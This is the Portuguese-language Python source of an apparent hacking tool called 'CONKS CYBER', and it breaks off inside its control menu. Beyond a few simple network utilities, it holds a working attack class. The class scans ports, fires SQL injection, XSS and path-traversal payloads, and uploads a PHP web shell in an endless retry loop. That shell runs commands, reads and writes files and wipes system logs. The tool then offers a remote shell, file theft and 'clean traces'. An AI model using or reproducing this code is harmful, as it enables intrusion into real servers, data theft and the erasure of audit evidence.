# ==========================================
# CONKS CYBER - VERSÃO ULTIMATE CORRIGIDA
# main.py
# ==========================================

import os
import sys
import socket
import urllib.request
import urllib.error
import subprocess
import time
import random
import threading
import webbrowser
import json
import re
import hashlib
import base64
import datetime
import http.client
import ssl
import ipaddress

from modules.generators import menu_geradores
from modules.consultas import menu_consultas
from modules.osint import menu_osint


# ==========================================
# CORES
# ==========================================

RESET = "\033[0m"
BOLD = "\033[1m"

WHITE = "\033[97m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GRAY = "\033[90m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
ORANGE = "\033[38;5;214m"
PINK = "\033[38;5;201m"
LIME = "\033[38;5;154m"
GOLD = "\033[38;5;220m"


# ==========================================
# CONFIGURAÇÃO DAS CAIXAS
# ==========================================

LARGURA = 55


# ==========================================
# LIMPAR TELA
# ==========================================

def limpar_tela():
    os.system("clear")


# ==========================================
# FUNÇÕES DE CAIXA
# ==========================================

def linha_caixa(texto="", cor=WHITE, negrito=False):
    texto = str(texto)
    limite = LARGURA - 4
    if len(texto) > limite:
        texto = texto[:limite]
    texto = texto.ljust(limite)
    estilo = BOLD if negrito else ""
    print(f"{cor}{estilo}║ {texto} ║{RESET}")


def topo_caixa(titulo):
    largura = LARGURA - 2
    print(f"{BLUE}{BOLD}╔{'═' * largura}╗{RESET}")
    linha_caixa(titulo.center(LARGURA - 4), BLUE, True)
    print(f"{BLUE}{BOLD}╠{'═' * largura}╣{RESET}")


def fim_caixa():
    largura = LARGURA - 2
    print(f"{BLUE}{BOLD}╚{'═' * largura}╝{RESET}")


# ==========================================
# MENSAGENS
# ==========================================

def sucesso(texto):
    print(f"{GREEN}[+] {texto}{RESET}")

def erro(texto):
    print(f"{RED}[-] {texto}{RESET}")

def aviso(texto):
    print(f"{RED}[!] {texto}{RESET}")

def info(texto):
    print(f"{BLUE}[i] {texto}{RESET}")


# ==========================================
# BANNER
# ==========================================

def banner():
    print(f"{GREEN}{BOLD}")
    print(r"""
 ██████╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗
██╔════╝██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝
██║     ██║   ██║██╔██╗ ██║█████╔╝ ███████╗
██║     ██║   ██║██║╚██╗██║██╔═██╗ ╚════██║
╚██████╗╚██████╔╝██║ ╚████║██║  ██╗███████║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
""")
    print(f"{BLUE}{BOLD}                 CYBER{RESET}\n")


# ==========================================
# TESTAR CONEXÃO
# ==========================================

def testar_conexao():
    print()
    topo_caixa("TESTE DE CONEXAO")
    linha_caixa("")

    servidores = [
        ("Google", "google.com", 443),
        ("Cloudflare", "cloudflare.com", 443),
        ("GitHub", "github.com", 443)
    ]

    online = False
    for nome, host, porta in servidores:
        try:
            conexao = socket.create_connection((host, porta), timeout=3)
            conexao.close()
            print(f"{GREEN}[+] {nome:<15} ONLINE{RESET}")
            online = True
        except:
            print(f"{RED}[-] {nome:<15} OFFLINE{RESET}")

    print()
    fim_caixa()
    if online:
        sucesso("Conexao disponivel.")
    else:
        erro("Sem conexao.")


# ==========================================
# MEU IP PÚBLICO
# ==========================================

def meu_ip_publico():
    print()
    topo_caixa("MEU IP PUBLICO")
    linha_caixa("")

    servicos = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com"
    ]

    for url in servicos:
        try:
            requisicao = urllib.request.Request(url, headers={"User-Agent": "CONKS-Cyber/1.0"})
            with urllib.request.urlopen(requisicao, timeout=5) as resposta:
                ip = resposta.read().decode("utf-8").strip()
            if ip:
                linha_caixa(f"IP: {ip}", GREEN, True)
                fim_caixa()
                return
        except:
            continue

    fim_caixa()
    erro("Nao foi possivel obter o IP.")


# ==========================================
# ATUALIZAR PAINEL
# ==========================================

def atualizar_painel():
    limpar_tela()
    topo_caixa("ATUALIZAR")
    linha_caixa("")
    linha_caixa("CONKS UPDATE", WHITE, True)
    linha_caixa("")
    fim_caixa()
    print(f"\n{BLUE}[~] Verificando...{RESET}")
    time.sleep(0.5)
    
    try:
        resultado = subprocess.run(
            ["git", "pull", "origin", "main"],
            capture_output=True,
            text=True,
            timeout=60
        )
        saida = resultado.stdout + resultado.stderr
        
        if resultado.returncode != 0:
            print(f"\n{RED}[-] Erro ao atualizar.{RESET}")
            if saida.strip():
                print(f"\n{GRAY}{saida.strip()}{RESET}")
            input("\nENTER para voltar...")
            return
        
        if "Already up to date" in saida:
            print()
            print(f"{YELLOW}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("ATUALIZADO!", YELLOW, True)
            linha_caixa("Versao mais recente.", YELLOW)
            print(f"{YELLOW}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
            input("\nENTER para voltar...")
            return
        
        print()
        print(f"{GREEN}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
        linha_caixa("ATUALIZADO!", GREEN, True)
        linha_caixa("Painel atualizado.", GREEN)
        print(f"{GREEN}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
        print(f"\n{BLUE}[~] Reiniciando...{RESET}")
        time.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
        
    except Exception as e:
        erro(f"Erro: {e}")
        input("\nENTER para voltar...")


# ==========================================
# MENU REDE
# ==========================================

def menu_rede():
    while True:
        limpar_tela()
        banner()
        topo_caixa("REDE")
        linha_caixa("[1] Meu IP")
        linha_caixa("[2] Testar conexao")
        linha_caixa("")
        linha_caixa("[0] Voltar", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Rede > {RESET}").strip()
        
        if opcao == "1":
            meu_ip_publico()
        elif opcao == "2":
            testar_conexao()
        elif opcao == "0":
            break
        else:
            erro("Opcao invalida.")
        
        if opcao != "0":
            input("\nENTER para continuar...")


# ==========================================
# ⭐ CYBER INVASION ULTIMATE - CLASSE ⭐
# ==========================================

class CyberInvasionUltimate:
    """Cyber Invasion ULTIMATE com backdoor infinito"""
    
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.vulnerabilidades = {}
        self.dados = {}
        self.backdoor_instalado = False
        self.backdoor_url = None
        self.usuarios = []
        self.arquivos = []
        self.diretorios = []
        self.subdominios = []
        self.portas_abertas = []
        self.tentativas = 0
        
    # ==========================================
    # SCAN DE PORTAS
    # ==========================================
    
    def scan_portas(self):
        """Escaneia portas comuns"""
        print(f"\n{CYAN}[~] Scan de Portas...{RESET}")
        
        portas = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
            6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB"
        }
        
        abertas = []
        print(f"  {BLUE}[→] Escaneando portas...{RESET}")
        
        for porta, servico in portas.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                resultado = sock.connect_ex((self.target, porta))
                if resultado == 0:
                    abertas.append({"porta": porta, "servico": servico})
                    print(f"    {GREEN}[+] Porta {porta} - {servico} ABERTA{RESET}")
                sock.close()
            except:
                pass
        
        self.portas_abertas = abertas
        self.dados['portas_abertas'] = abertas
        
        if abertas:
            print(f"\n  {GREEN}[+] {len(abertas)} portas abertas{RESET}")
        else:
            print(f"  {YELLOW}[!] Nenhuma porta aberta{RESET}")
        
        return abertas
    
    # ==========================================
    # TESTE SQL INJECTION
    # ==========================================
    
    def testar_sql_injection(self):
        """Testa SQL Injection"""
        print(f"\n{CYAN}[~] Testando SQL Injection...{RESET}")
        
        endpoints = [
            "/login.php?user=admin&pass=123",
            "/index.php?page=1",
            "/produto.php?id=1",
            "/busca.php?q=teste",
            "/search.php?q=teste"
        ]
        
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
            "' UNION SELECT 1,2,3,4,5 --"
        ]
        
        encontrados = []
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    url = f"http://{self.target}:{self.port}{endpoint}&payload={payload}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        if any(x in html.lower() for x in ["sql", "syntax", "mysql", "error"]):
                            encontrados.append({"endpoint": endpoint, "payload": payload})
                            print(f"    {RED}[!] SQL: {endpoint} -> {payload}{RESET}")
                except:
                    continue
        
        self.vulnerabilidades['sql_injection'] = encontrados
        return encontrados
    
    # ==========================================
    # TESTE XSS
    # ==========================================
    
    def testar_xss(self):
        """Testa XSS"""
        print(f"\n{CYAN}[~] Testando XSS...{RESET}")
        
        endpoints = [
            "/search.php?q=teste",
            "/busca.php?q=teste",
            "/comentario.php?texto=teste"
        ]
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ]
        
        encontrados = []
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    url = f"http://{self.target}:{self.port}{endpoint}&xss={payload}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        if payload in html or "script" in html.lower():
                            encontrados.append({"endpoint": endpoint, "payload": payload})
                            print(f"    {RED}[!] XSS: {endpoint} -> {payload[:30]}...{RESET}")
                except:
                    continue
        
        self.vulnerabilidades['xss'] = encontrados
        return encontrados
    
    # ==========================================
    # TESTE LFI
    # ==========================================
    
    def testar_lfi(self):
        """Testa LFI"""
        print(f"\n{CYAN}[~] Testando LFI...{RESET}")
        
        endpoints = [
            "/page.php?file=teste",
            "/index.php?pagina=teste",
            "/view.php?page=teste"
        ]
        
        payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd"
        ]
        
        encontrados = []
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    url = f"http://{self.target}:{self.port}{endpoint}&file={payload}"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if response.getcode() == 200:
                        html = response.read().decode('utf-8', errors='ignore')
                        if any(x in html for x in ["root:", "bin:", "daemon:", "nologin"]):
                            encontrados.append({"endpoint": endpoint, "payload": payload})
                            print(f"    {RED}[!] LFI: {endpoint} -> {payload}{RESET}")
                except:
                    continue
        
        self.vulnerabilidades['lfi'] = encontrados
        return encontrados
    
    # ==========================================
    # TESTE UPLOAD
    # ==========================================
    
    def testar_upload(self):
        """Testa upload"""
        print(f"\n{CYAN}[~] Testando Upload...{RESET}")
        
        upload_urls = [
            "/upload.php",
            "/uploads/",
            "/enviar.php",
            "/up.php",
            "/upload/",
            "/fileupload.php"
        ]
        
        encontrados = []
        
        for upload_url in upload_urls:
            try:
                test_file = b"<?php echo 'UPLOAD_TEST'; ?>"
                
                boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
                body = (f"--{boundary}\r\n"
                       f"Content-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n"
                       f"Content-Type: application/x-php\r\n\r\n").encode()
                body += test_file
                body += f"\r\n--{boundary}--\r\n".encode()
                
                headers = {
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": f"multipart/form-data; boundary={boundary}"
                }
                
                req = urllib.request.Request(
                    f"http://{self.target}:{self.port}{upload_url}",
                    data=body,
                    headers=headers
                )
                response = urllib.request.urlopen(req, timeout=5)
                
                if response.getcode() in [200, 201, 302]:
                    encontrados.append(upload_url)
                    print(f"    {RED}[!] Upload: {upload_url}{RESET}")
            except:
                continue
        
        self.vulnerabilidades['upload'] = encontrados
        return encontrados
    
    # ==========================================
    # SCAN COMPLETO
    # ==========================================
    
    def scan_completo(self):
        """Scan completo"""
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     🔍 SCAN ULTIMATE           ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (20 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        self.scan_portas()
        self.testar_sql_injection()
        self.testar_xss()
        self.testar_lfi()
        self.testar_upload()
        self.verificar_backdoor()
        
        return True
    
    # ==========================================
    # VERIFICAR BACKDOOR
    # ==========================================
    
    def verificar_backdoor(self):
        """Verifica se já existe backdoor"""
        urls = [
            f"http://{self.target}:{self.port}/uploads/shell.php",
            f"http://{self.target}:{self.port}/shell.php",
            f"http://{self.target}:{self.port}/backdoor.php",
            f"http://{self.target}:{self.port}/cmd.php",
            f"http://{self.target}:{self.port}/admin.php"
        ]
        
        for url in urls:
            try:
                req = urllib.request.Request(
                    f"{url}?cmd=echo%20'OK'",
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                response = urllib.request.urlopen(req, timeout=3)
                if response.getcode() == 200:
                    self.backdoor_url = url
                    self.backdoor_instalado = True
                    print(f"  {GREEN}[+] Backdoor encontrado: {url}{RESET}")
                    return True
            except:
                continue
        return False
    
    # ==========================================
    # INSTALAR BACKDOOR - INFINITO!
    # ==========================================
    
    def instalar_backdoor(self):
        """Instala backdoor - TENTA INFINITAMENTE"""
        print(f"\n{RED}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{RED}║     🔥 INSTALANDO BACKDOOR      ║{RESET}")
        print(f"{RED}║     TENTANDO ATE CONSEGUIR!    ║{RESET}")
        print(f"{RED}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        shell_php = """<?php
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
if(isset($_GET['info'])){ echo gethostname().'|'.get_current_user().'|'.$_SERVER['SERVER_ADDR']; }
if(isset($_POST['upload'])){ file_put_contents($_POST['name'], base64_decode($_POST['data'])); echo 'OK'; }
if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var/log/syslog && history -c'); }
?>"""
        
        shell_code = shell_php.encode('utf-8')
        
        # TODAS AS URLS POSSIVEIS
        upload_urls = [
            f"http://{self.target}:{self.port}/upload.php",
            f"http://{self.target}:{self.port}/uploads/",
            f"http://{self.target}:{self.port}/enviar.php",
            f"http://{self.target}:{self.port}/up.php",
            f"http://{self.target}:{self.port}/upload/",
            f"http://{self.target}:{self.port}/fileupload.php",
            f"http://{self.target}:{self.port}/admin/upload.php",
            f"http://{self.target}:{self.port}/wp-admin/upload.php",
            f"http://{self.target}:{self.port}/uploader.php",
            f"http://{self.target}:{self.port}/upload-file.php",
            f"http://{self.target}:{self.port}/send.php",
            f"http://{self.target}:{self.port}/receive.php"
        ]
        
        # NOMES DE ARQUIVO
        nomes_arquivos = [
            "shell.php", "backdoor.php", "cmd.php", "admin.php",
            "x.php", "test.php", "1.php", "a.php", "b.php", "c.php",
            "system.php", "exec.php", "cmd-shell.php", "back-door.php"
        ]
        
        # DIRETORIOS PARA TENTAR ESCREVER
        diretorios = [
            "/var/www/html/",
            "/var/www/",
            "/var/html/",
            "/www/",
            "/html/",
            "/public_html/",
            "/htdocs/",
            "/var/www/public/",
            "/var/www/html/public/"
        ]
        
        tentativa = 0
        
        print(f"\n{CYAN}[~] Iniciando tentativas infinitas...{RESET}")
        print(f"{YELLOW}[!] Pressione Ctrl+C para parar{RESET}\n")
        
        while not self.backdoor_instalado:
            tentativa += 1
            self.tentativas = tentativa
            
            # ==========================================
            # METODO 1: UPLOAD VIA FORMULARIO
            # ==========================================
            for upload_url in upload_urls:
                for nome in nomes_arquivos:
                    try:
                        boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
                        body = (f"--{boundary}\r\n"
                               f"Content-Disposition: form-data; name=\"file\"; filename=\"{nome}\"\r\n"
                               f"Content-Type: application/x-php\r\n\r\n").encode()
                        body += shell_code
                        body += f"\r\n--{boundary}--\r\n".encode()
                        
                        headers = {
                            "User-Agent": "Mozilla/5.0",
                            "Content-Type": f"multipart/form-data; boundary={boundary}"
                        }
                        
                        req = urllib.request.Request(upload_url, data=body, headers=headers)
                        response = urllib.request.urlopen(req, timeout=5)
                        
                        if response.getcode() in [200, 201, 302]:
                            print(f"  {GREEN}[+] Tentativa {tentativa}: Upload enviado para {upload_url} ({nome}){RESET}")
                            
                            # Testa se instalou
                            if self._testar_backdoor():
                                return True
                    except:
                        continue
            
            # ==========================================
            # METODO 2: VIA LFI
            # ==========================================
            if self.vulnerabilidades.get('lfi'):
                for diretorio in diretorios:
                    for nome in nomes_arquivos[:3]:
                        try:
                            # Tenta escrever via LFI
                            payload = f"../../../../..{diretorio}{nome}"
                            url = f"http://{self.target}:{self.port}/page.php?file={payload}"
                            
                            # Tenta ler para ver se existe
                            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                            response = urllib.request.urlopen(req, timeout=3)
                            
                            if response.getcode() == 200:
                                print(f"  {GREEN}[+] Tentativa {tentativa}: LFI em {diretorio}{nome}{RESET}")
                                if self._testar_backdoor():
                                    return True
                        except:
                            continue
            
            # ==========================================
            # METODO 3: VIA POST DIRETO
            # ==========================================
            for nome in nomes_arquivos[:5]:
                try:
                    data = f"<?php system($_GET['cmd']); ?>".encode()
                    req = urllib.request.Request(
                        f"http://{self.target}:{self.port}/",
                        data=data,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    response = urllib.request.urlopen(req, timeout=3)
                    
                    if self._testar_backdoor():
                        return True
                except:
                    continue
            
            # ==========================================
            # METODO 4: VIA COMANDO (se tiver shell)
            # ==========================================
            if self.backdoor_instalado:
                try:
                    self.executar_comando("echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell2.php")
                    if self._testar_backdoor():
                        return True
                except:
                    pass
            
            # ==========================================
            # METODO 5: TENTAR CRIAR DIRETORIO
            # ==========================================
            for upload_url in upload_urls:
                try:
                    # Tenta criar diretório uploads
                    req = urllib.request.Request(
                        f"{upload_url}mkdir",
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    response = urllib.request.urlopen(req, timeout=3)
                except:
                    pass
            
            # Mostra progresso a cada 10 tentativas
            if tentativa % 10 == 0:
                print(f"  {YELLOW}[!] Tentativa {tentativa}: Nenhum sucesso ainda... continuando...{RESET}")
                time.sleep(0.5)
            
            # Pequena pausa para não sobrecarregar
            time.sleep(0.1)
        
        return False
    
    # ==========================================
    # TESTA BACKDOOR
    # ==========================================
    
    def _testar_backdoor(self):
        """Testa se o backdoor foi instalado em QUALQUER lugar"""
        urls = [
            f"http://{self.target}:{self.port}/uploads/shell.php",
            f"http://{self.target}:{self.port}/shell.php",
            f"http://{self.target}:{self.port}/backdoor.php",
            f"http://{self.target}:{self.port}/cmd.php",
            f"http://{self.target}:{self.port}/admin.php",
            f"http://{self.target}:{self.port}/x.php",
            f"http://{self.target}:{self.port}/test.php",
            f"http://{self.target}:{self.port}/1.php",
            f"http://{self.target}:{self.port}/a.php",
            f"http://{self.target}:{self.port}/system.php",
            f"http://{self.target}:{self.port}/exec.php",
            f"http://{self.target}:{self.port}/shell2.php"
        ]
        
        for url in urls:
            try:
                req = urllib.request.Request(
                    f"{url}?cmd=echo%20'OK'",
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                response = urllib.request.urlopen(req, timeout=3)
                
                if response.getcode() == 200:
                    html = response.read().decode('utf-8', errors='ignore')
                    if "OK" in html or "cmd" in html or "system" in html:
                        self.backdoor_url = url
                        self.backdoor_instalado = True
                        print(f"\n{GREEN}╔{'═' * (LARGURA - 2)}╗{RESET}")
                        print(f"{GREEN}║     ✅ BACKDOOR INSTALADO!      ║{RESET}")
                        print(f"{GREEN}║     📍 {url[:40]}║{RESET}")
                        print(f"{GREEN}╚{'═' * (LARGURA - 2)}╝{RESET}")
                        return True
            except:
                continue
        
        return False
    
    # ==========================================
    # EXECUTAR COMANDO
    # ==========================================
    
    def executar_comando(self, comando):
        """Executa comando no servidor"""
        if not self.backdoor_url:
            return "Backdoor nao instalado!"
        
        try:
            url = f"{self.backdoor_url}?cmd={urllib.parse.quote(comando)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            return response.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Erro: {str(e)}"
    
    # ==========================================
    # BAIXAR ARQUIVO
    # ==========================================
    
    def baixar_arquivo(self, arquivo):
        """Baixa arquivo do servidor"""
        if not self.backdoor_url:
            print(f"{RED}[!] Backdoor nao instalado!{RESET}")
            return False
        
        try:
            url = f"{self.backdoor_url}?file={urllib.parse.quote(arquivo)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            
            conteudo = response.read()
            nome = arquivo.split('/')[-1] or 'arquivo'
            nome_arquivo = f"download_{datetime.datetime.now().strftime('%H%M%S')}_{nome}"
            
            with open(nome_arquivo, 'wb') as f:
                f.write(conteudo)
            
            print(f"{GREEN}[+] Baixado: {nome_arquivo} ({len(conteudo)} bytes){RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # ENVIAR ARQUIVO
    # ==========================================
    
    def enviar_arquivo(self, local, remoto):
        """Envia arquivo para o servidor"""
        if not self.backdoor_url:
            print(f"{RED}[!] Backdoor nao instalado!{RESET}")
            return False
        
        try:
            if not os.path.exists(local):
                print(f"{RED}[-] Arquivo nao encontrado: {local}{RESET}")
                return False
            
            with open(local, 'rb') as f:
                dados = base64.b64encode(f.read()).decode()
            
            data = f"upload=1&name={remoto}&data={dados}".encode()
            req = urllib.request.Request(
                self.backdoor_url,
                data=data,
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            response = urllib.request.urlopen(req, timeout=10)
            
            print(f"{GREEN}[+] Enviado: {remoto}{RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # TERMINAL INTERATIVO
    # ==========================================
    
    def terminal_interativo(self):
        """Terminal interativo"""
        if not self.backdoor_instalado:
            print(f"\n{RED}[!] Backdoor nao instalado!{RESET}")
            return
        
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     ⚡ TERMINAL INTERATIVO      ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (23 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}║ Digite 'exit' para sair         ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        while True:
            comando = input(f"\n{RED}shell@{self.target}>{RESET} ").strip()
            
            if not comando:
                continue
            
            if comando.lower() in ['exit', 'quit', 'sair']:
                print(f"{YELLOW}[!] Terminal encerrado{RESET}")
                break
            
            if comando.lower().startswith('download '):
                arquivo = comando[9:].strip()
                self.baixar_arquivo(arquivo)
                continue
            
            if comando.lower().startswith('upload '):
                partes = comando[7:].strip().split()
                if len(partes) >= 2:
                    self.enviar_arquivo(partes[0], partes[1])
                continue
            
            resultado = self.executar_comando(comando)
            print(f"{WHITE}{resultado}{RESET}")
    
    # ==========================================
    # MOSTRA RESULTADOS
    # ==========================================
    
    def mostrar_resultados(self):
        """Mostra resultados do scan"""
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     📊 RESULTADOS ENCONTRADOS  ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (21 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        # Portas
        if self.portas_abertas:
            print(f"\n{CYAN}┌─ PORTAS ABERTAS ({len(self.portas_abertas)}){RESET}")
            for porta in self.portas_abertas[:10]:
                print(f"  {GREEN}[+] {porta['porta']} - {porta['servico']}{RESET}")
        
        # SQL Injection
        if self.vulnerabilidades.get('sql_injection'):
            print(f"\n{RED}┌─ SQL INJECTION ({len(self.vulnerabilidades['sql_injection'])}){RESET}")
            for vuln in self.vulnerabilidades['sql_injection'][:5]:
                print(f"  {RED}[!] {vuln['endpoint']} -> {vuln['payload']}{RESET}")
        
        # XSS
        if self.vulnerabilidades.get('xss'):
            print(f"\n{RED}┌─ XSS ({len(self.vulnerabilidades['xss'])}){RESET}")
            for vuln in self.vulnerabilidades['xss'][:5]:
                print(f"  {RED}[!] {vuln['endpoint']} -> {vuln['payload'][:30]}...{RESET}")
        
        # LFI
        if self.vulnerabilidades.get('lfi'):
            print(f"\n{RED}┌─ LFI ({len(self.vulnerabilidades['lfi'])}){RESET}")
            for vuln in self.vulnerabilidades['lfi'][:5]:
                print(f"  {RED}[!] {vuln['endpoint']} -> {vuln['payload']}{RESET}")
        
        # Upload
        if self.vulnerabilidades.get('upload'):
            print(f"\n{RED}┌─ UPLOAD ({len(self.vulnerabilidades['upload'])}){RESET}")
            for upload in self.vulnerabilidades['upload'][:5]:
                print(f"  {RED}[!] {upload}{RESET}")
        
        # Backdoor
        if self.backdoor_instalado:
            print(f"\n{GREEN}┌─ BACKDOOR INSTALADO{RESET}")
            print(f"  {GREEN}[+] URL: {self.backdoor_url}{RESET}")
            print(f"  {GREEN}[+] Tentativas: {self.tentativas}{RESET}")
        else:
            print(f"\n{YELLOW}┌─ BACKDOOR{RESET}")
            print(f"  {YELLOW}[!] Nao instalado - Use opcao [1]{RESET}")


# ==========================================
# ⭐ CYBER INVASION - FUNÇÃO PRINCIPAL ⭐
# ==========================================

def cyber_invasion():
    """Cyber Invasion ULTIMATE"""
    
    limpar_tela()
    
    print("\n╔══════════════════════════════════════════╗")
    print("║    🚀 CYBER INVASION ULTIMATE         ║")
    print("╠══════════════════════════════════════════╣")
    print("║  SCAN COMPLETO EM TODOS OS ASPECTOS    ║")
    print("║  BACKDOOR TENTA ATE CONSEGUIR!        ║")
    print("║  APENAS EM SERVIDORES PROPIOS!        ║")
    print("╚══════════════════════════════════════════╝")
    
    print("\n[~] Digite o alvo:")
    print("[1] IP Local (127.0.0.1)")
    print("[2] Site/Dominio")
    print("[3] Voltar")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "3":
        return
    
    if opcao == "1":
        alvo = input("\nIP: ").strip()
        if alvo == "":
            alvo = "127.0.0.1"
    elif opcao == "2":
        alvo = input("\nSite: ").strip()
        alvo = alvo.replace("http://", "").replace("https://", "").split("/")[0]
    else:
        print("[-] Opcao invalida.")
        input("\nENTER para continuar...")
        return
    
    if not alvo:
        print("[-] Alvo invalido.")
        input("\nENTER para continuar...")
        return
    
    try:
        porta = int(input("\nPorta (80): ").strip() or "80")
    except:
        porta = 80
    
    # AVISO LEGAL
    print(f"\n{RED}{BOLD}╔══════════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}║        ⚠️  AVISO LEGAL                 ║{RESET}")
    print(f"{RED}{BOLD}╠══════════════════════════════════════════╣{RESET}")
    print(f"{RED}║  • Voce esta invadindo {alvo}        ║{RESET}")
    print(f"{RED}║  • So e permitido em servidores       ║{RESET}")
    print(f"{RED}║    que voce POSSUI!                   ║{RESET}")
    print(f"{RED}║  • Invadir outros e CRIME!            ║{RESET}")
    print(f"{RED}{BOLD}╚══════════════════════════════════════════╝{RESET}")
    
    confirm = input(f"\n{RED}Confirma que {alvo} e seu? (s/N): {RESET}").strip().lower()
    
    if confirm != 's':
        print("[-] Cancelado.")
        input("\nENTER para continuar...")
        return
    
    # INICIA INVASAO
    invasor = CyberInvasionUltimate(alvo, porta)
    
    # SCAN COMPLETO
    invasor.scan_completo()
    
    # MOSTRA RESULTADOS
    invasor.mostrar_resultados()
    
    # ==========================================
    # MENU DE OPCOES
    # ==========================================
    
    while True:
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║    🎯 MENU DE CONTROLE         ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        
        if invasor.backdoor_instalado:
            print(f"{GREEN}║ ✅ Backdoor: INSTALADO         ║{RESET}")
            print(f"{GREEN}║ 📍 {invasor.backdoor_url[:35]}{' ' * (10) }║{RESET}")
        else:
            print(f"{RED}║ ❌ Backdoor: NAO INSTALADO     ║{RESET}")
        
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ [1] Instalar Backdoor (INFINITO)║{RESET}")
        print(f"{PURPLE}║ [2] Terminal Interativo          ║{RESET}")
        print(f"{PURPLE}║ [3] Executar Comando             ║{RESET}")
        print(f"{PURPLE}║ [4] Baixar Arquivo               ║{RESET}")
        print(f"{PURPLE}║ [5] Enviar Arquivo               ║{RESET}")
        print(f"{PURPLE}║ [6] Info do Servidor             ║{RESET}")
        print(f"{PURPLE}║ [7] Limpar Rastros               ║{RESET}")
        print(f"{PURPLE}║ [8] Sair                         ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        sub_opcao = input(f"\n{RED}cyber@{alvo}>{RESET} ").strip()
